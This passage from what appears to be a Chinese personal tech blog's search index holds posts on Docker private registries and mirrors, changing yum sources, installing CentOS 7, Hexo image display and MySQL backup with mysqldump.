打开浏览器，访问 http://宿主机ip:5000/v2/_catalog，返回{“repositories”:[]}表明私有仓库搭建成功，并且内容为空 修改daemon.json 1vi /etc/docker/daemon.json 添加或修改以下内容，而后保存退出，此步用于让 docker 信任私有仓库地址 1&#123;&quot;insecure-registries&quot;:[&quot;宿主机ip:5000&quot;]&#125; 重启docker服务 1systemctl restart docker 镜像上传至私有仓库 标记此镜像为私有仓库的镜像 1docker tag redis 宿主机ip:5000/redis 再次启动私有仓库 1docker start registry 上传标记的镜像到私有仓库 1docker push 宿主机ip:5000/redis 可能会出现的错误或警告 Warning: Stopping docker.service, but it can still be activated by: docker.socket 一般出现在停止docker运行的时候，原因是 Docker 在关闭状态下被访问自动唤醒机制，意味如果试图连接到 docker socket，而 docker 服务没有运行，系统将自动启动docker。 解决办法 方法1、(推荐) 1systemctl stop docker.socket 方法2、 删除docker.socket 1rm -f /lib/systemd/system/docker.socket Error response from daemon: Get &quot;https://registry-1.docker.io/v2/&quot;: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers) 这种错误是因为国内把docker的官方源墙了，所以访问不了。 开始换源 而后进入/etc/docker修改daemon.json，如果没有这个json文件就新建一个 如果是用snap安装的docker，则进入/var/snap/docker/current/config/目录修改daemon.json 12345cd /etc/docker# 查看有没有daemon.json文件ls# 如果没有就新建touch daemon.json 编辑daemon.json 1vi daemon.json 添加以下配置 12345678910111213141516171819&#123; &quot;registry-mirrors&quot;:[ &quot;https://docker.1panel.live&quot;, &quot;https://hub.rat.dev&quot;, &quot;https://docker.registry.cyou&quot;, &quot;https://docker-cf.registry.cyou&quot;, &quot;https://dockercf.jsdelivr.fyi&quot;, &quot;https://docker.jsdelivr.fyi&quot;, &quot;https://dockertest.jsdelivr.fyi&quot;, &quot;https://docker.nju.edu.cn&quot;, &quot;https://docker.mirrors.sjtug.sjtu.edu.cn&quot;, &quot;https://mirror.iscas.ac.cn&quot;, &quot;https://docker.rainbond.cc&quot;, &quot;https://dockerhub.icu&quot;, &quot;https://hub.uuuadc.top&quot;, &quot;https://docker.anyhub.us.kg&quot;, &quot;https://docker.awsl9527.cn&quot; ]&#125; 然后重启docker即可，上面的那些源有可能某些失效了，视情况决定是否删除。 123service docker restart# 如果用的是snap安装的dockersnap restart docker Job for docker.service failed because start of the service was attempted too often. See “systemctl status docker.service” and “journalctl -xe” for details. To force a start use “systemctl reset-failed docker.service” followed by “systemctl start docker.service” again. 这个错误有可能是daemon.json文件里面可能有语法错误导致启动不了，检查这个文件哪里写错了。 Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? 这个错误是没有启动docker，启动一下就行了 1234systemctl start dockerservice docker restart# 如果用的是snap安装的dockersnap restart docker Warning: docker.service changed on disk. Run ‘systemctl daemon-reload’ to reload units. 根据提示执行命令即可 1systemctl daemon-reload","categories":[{"name":"安装","slug":"安装","permalink":"https://bestflyteng.github.io/categories/%E5%AE%89%E8%A3%85/"},{"name":"使用","slug":"安装/使用","permalink":"https://bestflyteng.github.io/categories/%E5%AE%89%E8%A3%85/%E4%BD%BF%E7%94%A8/"},{"name":"配置","slug":"安装/使用/配置","permalink":"https://bestflyteng.github.io/categories/%E5%AE%89%E8%A3%85/%E4%BD%BF%E7%94%A8/%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"Centos7","slug":"Centos7","permalink":"https://bestflyteng.github.io/tags/Centos7/"},{"name":"Linux","slug":"Linux","permalink":"https://bestflyteng.github.io/tags/Linux/"},{"name":"docker","slug":"docker","permalink":"https://bestflyteng.github.io/tags/docker/"}]},{"title":"换 yum 源","slug":"202408191114","date":"2024-08-19T03:14:54.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/241dfea9/","permalink":"https://bestflyteng.github.io/posts/241dfea9/","excerpt":"","text":"备份原有源配置文件 1sudo mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup 下载国内源配置文件(这里用的是阿里云的仓库)，并移动到源目录里 12sudo curl -O http://mirrors.aliyun.com/repo/Centos-7.reposudo mv Centos-7.repo /etc/yum.repos.d/CentOS-Base.repo 刷新yum缓存 12sudo yum clean allsudo yum makecache fast 检查是否更换成功 1sudo yum repolist 更新软件包 1yum -y update 至此，换源完成~","categories":[{"name":"配置","slug":"配置","permalink":"https://bestflyteng.github.io/categories/%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"Centos7","slug":"Centos7","permalink":"https://bestflyteng.github.io/tags/Centos7/"},{"name":"Linux","slug":"Linux","permalink":"https://bestflyteng.github.io/tags/Linux/"},{"name":"配置","slug":"配置","permalink":"https://bestflyteng.github.io/tags/%E9%85%8D%E7%BD%AE/"},{"name":"config","slug":"config","permalink":"https://bestflyteng.github.io/tags/config/"},{"name":"yum","slug":"yum","permalink":"https://bestflyteng.github.io/tags/yum/"}]},{"title":"Centos7 的安装与配置 - 2","slug":"202408181522","date":"2024-08-18T07:22:07.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/11b721d4/","permalink":"https://bestflyteng.github.io/posts/11b721d4/","excerpt":"","text":"右键标签栏，点击设置 选择 CD/DVD，选择下载好的ISO镜像，点击确定 开机！ 开机之后，用方向键选择 Install Centos7 选项，按回车确认 选择语言 下滑选择安装位置 不会配置的选下面的自动配置分区，而后点击完成 配置安装源 如果配置是灰色的话，就像这样，就是没有连接网络，需要先连一下网络 点击完成回到刚才的页面 点击网络和主机名 连接到网络后，再次配置安装源，将安装源设置为国内的。 http://mirrors.aliyun.com/centos/7/os/x86_64/ 软件选择 这里我选择的是最小安装，方便学习和记录 在安装过程中可以根据需求来判断是否设置root密码或者创建用户 我不需要创建用户，所以我没有创建 漫长的等待…… Centos7！启动！！ 输入你的用户名和密码 没有创建用户的话就只有root用户 这样就装好了~","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://bestflyteng.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Centos7","slug":"Centos7","permalink":"https://bestflyteng.github.io/tags/Centos7/"},{"name":"Linux","slug":"Linux","permalink":"https://bestflyteng.github.io/tags/Linux/"}]},{"title":"Hexo 图片资源显示","slug":"202408181131","date":"2024-08-18T03:31:03.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/a6886184/","permalink":"https://bestflyteng.github.io/posts/a6886184/","excerpt":"","text":"安装 hexo-renderer-markdown-it hexo-renderer-markdown-it官网 12345# 如果安装过 hexo-renderer-marked，就卸载npm un hexo-renderer-markednpm i hexo-renderer-markdown-it 修改_config.yml 将 post_asset_folder 改为true 重新生成静态文件，并运行 1hexo clean &amp; hexo g &amp; hexo server","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://bestflyteng.github.io/categories/Hexo/"}],"tags":[{"name":"bug","slug":"bug","permalink":"https://bestflyteng.github.io/tags/bug/"}]},{"title":"Centos7 的安装与配置 - 1","slug":"202408181002","date":"2024-08-18T02:02:23.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/88be706e/","permalink":"https://bestflyteng.github.io/posts/88be706e/","excerpt":"","text":"下载镜像 以下内容仅按照我的配置写的，如有不足评论一下。 首先下载Centos7的镜像，这里我用的 阿里云的镜像 进入 7.9.2009/isos/x86_64/，下载 CentOS-7-x86_64-NetInstall-2009.iso 如果打开只有一个 readme 文件，说明这个版本的镜像没有提供下载。 安装 首先打开 VMware，创建新的虚拟机，这里安装到虚拟机里面 (物理机应该也是一样的) 选择自定义(高级)，然后下一步 这里选择稍后安装操作系统，然后下一步 这里选择Centos7 64位 这里可以给虚拟机起名字。 位置选C盘以外的盘，因为最后生成的虚拟机文件比较大(只有一个C盘当我没说…) 这里可以设置虚拟机的处理器(不懂别瞎选，默认的就行) 这里设置内存(不懂别瞎选，默认的就行) 这里建议选默认的 使用网络地址转换(NAT) 后面的默认推荐就可以 创建新虚拟磁盘，而后下一步 这里可以设置磁盘大小，也就是虚拟机的硬盘大小 选 将虚拟磁盘存储为单个文件，而后下一步 完成！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://bestflyteng.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Centos7","slug":"Centos7","permalink":"https://bestflyteng.github.io/tags/Centos7/"},{"name":"Linux","slug":"Linux","permalink":"https://bestflyteng.github.io/tags/Linux/"}]},{"title":"MySQL的备份与恢复 (mysqldump)","slug":"202408170839","date":"2024-08-17T00:39:19.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/4394775c/","permalink":"https://bestflyteng.github.io/posts/4394775c/","excerpt":"","text":"mysqldump 语法 1mysqldump [选项] 数据库名 [表名] &gt; 脚本.sql 选项 参数名 缩写 含义 --host -h 服务器IP地址 --port -P (大写) 服务器端口号 --password -p (小写) MySQL密码 --databases 指定要备份的数据库 --all-databases 备份MySQL服务器上的所有数据库 --compact 压缩模式，产生更少的输出 --comments 添加注释信息 --complete-insert 输出完成的插入语句 --lock-tables 备份前，锁定所有数据库表 --no-create-db/–no-create-info 禁止生成创建数据库语句 --force 当出现错误时仍然继续备份操作 --default-character-set 指定默认字符集 --add-locks 备份数据库表时锁定数据库表 示例 如果 -p 选项没有指定密码，那么控制台会等待输入密码 备份所有数据库 1mysqldump -uroot -p --all-databases &gt; all.sql 备份指定数据库 1mysqldump -uroot -p test &gt; test.sql 备份指定数据库指定表(多个表以空格间隔) 1mysqldump -uroot -p test table1 table2 &gt; test.sql 备份指定数据库排除某些表 1mysqldump -uroot -p test --ignore-table=test.table1 --ignore-table=test.table2 &gt; test.sql 恢复命令 命令行命令 123注：在导入备份数据库前，db_name如果没有，是需要创建的； 而且与db_name.sql中数据库名是一样的才可以导入。mysqladmin -uroot -p create db_name mysql -uroot -p db_name &lt; /backup/mysqldump/db_name.sql soure 方法 12mysql &gt; use db_namemysql &gt; source /backup/db_name.sql table th:nth-child(2){ width: 5rem; }","categories":[{"name":"MySQL","slug":"MySQL","permalink":"https://bestflyteng.github.io/categories/MySQL/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://bestflyteng.github.io/tags/SQL/"},{"name":"MySQL","slug":"MySQL","permalink":"https://bestflyteng.github.io/tags/MySQL/"},{"name":"备份","slug":"备份","permalink":"https://bestflyteng.github.io/tags/%E5%A4%87%E4%BB%BD/"}]},{"title":"我的第一篇博客","slug":"202408162041","date":"2024-08-16T12:41:12.000Z","updated":"2025-06-11T09:53:58.000Z","comments":true,"path":"posts/d95d7e09/","permalink":"https://bestflyteng.github.io/posts/d95d7e09/","excerpt":"","text":"这是我的第一篇博客，我以后会在这里分享一些技术，生活或记录学习状况。 同时我也会吸取一些建议或意见，进行修正。","categories":[{"name":"分享","slug":"分享","permalink":"https://bestflyteng.github.io/categories/%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"记录","slug":"记录","permalink":"https://bestflyteng.github.io/tags/%E8%AE%B0%E5%BD%95/"}]}],"categories":[{"name":"Linux","slug":"Linux","permalink":"https://bestflyteng.github.io/categories/Linux/"},{"name":"CentOS","slug":"Linux/CentOS","permalink":"https://bestflyteng.github.io/categories/Linux/CentOS/"},{"name":"Python","slug":"Python","permalink":"https://bestflyteng.github.io/categories/Python/"},{"name":"python","slug":"python","permalink":"https://bestflyteng.github.io/categories/python/"},{"name":"安装","slug":"安装","permalink":"https://bestflyteng.github.io/categories/%E5%AE%89%E8%A3%85/"},{"name":"使用","slug":"安装/使用","permalink":"https://bestflyteng.github.io/categories/%E5%AE%89%E8%A3%85/%E4%BD%BF%E7%94%A8/"},{"name":"配置","slug":"安装/使用/配置","permalink":"https://bestflyteng.github.io/categories/%E5%AE%89%E8%A3%85/%E4%BD%BF%E7%94%A8/%E9%85%8D%E7%BD%AE/"},{"name":"配置","slug":"配置","permalink":"https://bestflyteng.github.io/categories/%E9%85%8D%E7%BD%AE/"},{"name":"操作系统","slug":"操作系统","permalink":"https://bestflyteng.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"Hexo","slug":"Hexo","permalink":"https://bestflyteng.github.io/categories/Hexo/"},{"name":"MySQL","slug":"MySQL","permalink":"https://bestflyteng.github.io/categories/MySQL/"},{"name":"分享","slug":"分享","permalink":"https://bestflyteng.github.io/categories/%E5%88%86%E4%BA%AB/"}],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://bestflyteng.github.io/tags/sqlmap/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://bestflyteng.github.io/tags/Web-%E5%AE%89%E5%85%A8/"},{"name":"RuoYi","slug":"RuoYi","permalink":"https://bestflyteng.github.io/tags/RuoYi/"},{"name":"若依管理系统","slug":"若依管理系统","permalink":"https://bestflyteng.github.io/tags/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"},{"name":"前端分离版","slug":"前端分离版","permalink":"https://bestflyteng.github.io/tags/%E5%89%8D%E7%AB%AF%E5%88%86%E7%A6%BB%E7%89%88/"},{"name":"网络安全","slug":"网络安全","permalink":"https://bestflyteng.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"Web安全","permalink":"https://bestflyteng.github.io/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://bestflyteng.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"Win10","slug":"Win10","permalink":"https://bestflyteng.github.io/tags/Win10/"},{"name":"文件管理器","slug":"文件管理器","permalink":"https://bestflyteng.github.io/tags/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8/"},{"name":"注册表","slug":"注册表","permalink":"https://bestflyteng.github.io/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/"},{"name":"netdata","slug":"netdata","permalink":"https://bestflyteng.github.io/tags/netdata/"},{"name":"系统监控","slug":"系统监控","permalink":"https://bestflyteng.github.io/tags/%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7/"},{"name":"Centos 7","slug":"Centos-7","permalink":"https://bestflyteng.github.io/tags/Centos-7/"},{"name":"nacos","slug":"nacos","permalink":"https://bestflyteng.github.io/tags/nacos/"},{"name":"微服务","slug":"微服务","permalink":"https://bestflyteng.github.io/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"},{"name":"Vue3","slug":"Vue3","permalink":"https://bestflyteng.github.io/tags/Vue3/"},{"name":"Pinia","slug":"Pinia","permalink":"https://bestflyteng.github.io/tags/Pinia/"},{"name":"CSS","slug":"CSS","permalink":"https://bestflyteng.github.io/tags/CSS/"},{"name":"媒体查询","slug":"媒体查询","permalink":"https://bestflyteng.github.io/tags/%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2/"},{"name":"media","slug":"media","permalink":"https://bestflyteng.github.io/tags/media/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://bestflyteng.github.io/tags/JavaScript/"},{"name":"Promise","slug":"Promise","permalink":"https://bestflyteng.github.io/tags/Promise/"},{"name":"蓝桥杯","slug":"蓝桥杯","permalink":"https://bestflyteng.github.io/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/"},{"name":"Computed","slug":"Computed","permalink":"https://bestflyteng.github.io/tags/Computed/"},{"name":"Props","slug":"Props","permalink":"https://bestflyteng.github.io/tags/Props/"},{"name":"Spring","slug":"Spring","permalink":"https://bestflyteng.github.io/tags/Spring/"},{"name":"Spring security","slug":"Spring-security","permalink":"https://bestflyteng.github.io/tags/Spring-security/"},{"name":"docker","slug":"docker","permalink":"https://bestflyteng.github.io/tags/docker/"},{"name":"nginx","slug":"nginx","permalink":"https://bestflyteng.github.io/tags/nginx/"},{"name":"GitStack","slug":"GitStack","permalink":"https://bestflyteng.github.io/tags/GitStack/"},{"name":"Git","slug":"Git","permalink":"https://bestflyteng.github.io/tags/Git/"},{"name":"Spark","slug":"Spark","permalink":"https://bestflyteng.github.io/tags/Spark/"},{"name":"Scala","slug":"Scala","permalink":"https://bestflyteng.github.io/tags/Scala/"},{"name":"大数据","slug":"大数据","permalink":"https://bestflyteng.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"Linux","slug":"Linux","permalink":"https://bestflyteng.github.io/tags/Linux/"},{"name":"CentOS","slug":"CentOS","permalink":"https://bestflyteng.github.io/tags/CentOS/"},{"name":"IP","slug":"IP","permalink":"https://bestflyteng.github.io/tags/IP/"},{"name":"Pandas","slug":"Pandas","permalink":"https://bestflyteng.github.io/tags/Pandas/"},{"name":"Python","slug":"Python","permalink":"https://bestflyteng.github.io/tags/Python/"},{"name":"python","slug":"python","permalink":"https://bestflyteng.github.io/tags/python/"},{"name":"pandas","slug":"pandas","permalink":"https://bestflyteng.github.io/tags/pandas/"},{"name":"Centos7","slug":"Centos7","permalink":"https://bestflyteng.github.io/tags/Centos7/"},{"name":"配置","slug":"配置","permalink":"https://bestflyteng.github.io/tags/%E9%85%8D%E7%BD%AE/"},{"name":"config","slug":"config","permalink":"https://bestflyteng.github.io/tags/config/"},{"name":"yum","slug":"yum","permalink":"https://bestflyteng.github.io/tags/yum/"},{"name":"bug","slug":"bug","permalink":"https://bestflyteng.github.io/tags/bug/"},{"name":"SQL","slug":"SQL","permalink":"https://bestflyteng.github.io/tags/SQL/"},{"name":"MySQL","slug":"MySQL","permalink":"https://bestflyteng.github.io/tags/MySQL/"},{"name":"备份","slug":"备份","permalink":"https://bestflyteng.github.io/tags/%E5%A4%87%E4%BB%BD/"},{"name":"记录","slug":"记录","permalink":"https://bestflyteng.github.io/tags/%E8%AE%B0%E5%BD%95/"}]}